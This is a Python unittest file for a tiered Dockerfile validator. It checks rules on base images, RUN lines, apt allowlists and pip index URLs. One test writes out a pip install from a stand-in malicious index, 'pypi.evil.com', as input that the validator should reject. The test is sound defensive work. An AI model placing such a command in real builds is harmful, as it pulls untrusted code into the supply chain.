"""Tests for per-tier Dockerfile validation."""

import tempfile
import unittest
from pathlib import Path

from core.dockerfile_validator import DockerfileValidationError, validate
from core.skill_policy import TIER_BUNDLED, TIER_AUTHORED, TIER_IMPORTED


def _write(content: str) -> Path:
    tmp = tempfile.NamedTemporaryFile("w", suffix=".Dockerfile", delete=False)
    tmp.write(content)
    tmp.close()
    return Path(tmp.name)


class TestAuthoredTier(unittest.TestCase):
    def test_miniclaw_base_ok(self):
        df = _write("FROM miniclaw/base:latest\nCMD [\"python\", \"app.py\"]\n")
        validate(df, tier=TIER_AUTHORED)

    def test_ubuntu_base_rejected(self):
        df = _write("FROM ubuntu:latest\nCMD [\"bash\"]\n")
        with self.assertRaisesRegex(DockerfileValidationError, "base image"):
            validate(df, tier=TIER_AUTHORED)

    def test_pip_install_ok(self):
        df = _write(
            "FROM miniclaw/base:latest\n"
            "RUN pip install requests\n"
            "CMD [\"python\", \"app.py\"]\n"
        )
        validate(df, tier=TIER_AUTHORED)

    def test_arbitrary_run_rejected(self):
        df = _write(
            "FROM miniclaw/base:latest\n"
            "RUN echo hello > /tmp/x\n"
            "CMD [\"python\", \"app.py\"]\n"
        )
        with self.assertRaisesRegex(DockerfileValidationError, "RUN"):
            validate(df, tier=TIER_AUTHORED)


class TestImportedTier(unittest.TestCase):
    def test_allowed_apt_package(self):
        df = _write(
            "FROM miniclaw/base:latest\n"
            "RUN apt-get update && apt-get -y install curl\n"
            "CMD [\"python\", \"app.py\"]\n"
        )
        validate(df, tier=TIER_IMPORTED)

    def test_disallowed_apt_package(self):
        df = _write(
            "FROM miniclaw/base:latest\n"
            "RUN apt-get -y install bitcoind\n"
            "CMD [\"python\", \"app.py\"]\n"
        )
        with self.assertRaisesRegex(DockerfileValidationError, "apt.*allowlist"):
            validate(df, tier=TIER_IMPORTED)

    def test_pip_index_url_rejected(self):
        df = _write(
            "FROM miniclaw/base:latest\n"
            "RUN pip install --index-url http://pypi.evil.com/ requests\n"
            "CMD [\"python\", \"app.py\"]\n"
        )
        with self.assertRaisesRegex(DockerfileValidationError, "index-url"):
            validate(df, tier=TIER_IMPORTED)


class TestBundledTier(unittest.TestCase):
    def test_bundled_is_exempt(self):
        df = _write("FROM ubuntu:latest\nRUN echo hello\nCMD [\"true\"]\n")
        validate(df, tier=TIER_BUNDLED)


if __name__ == "__main__":
    unittest.main()
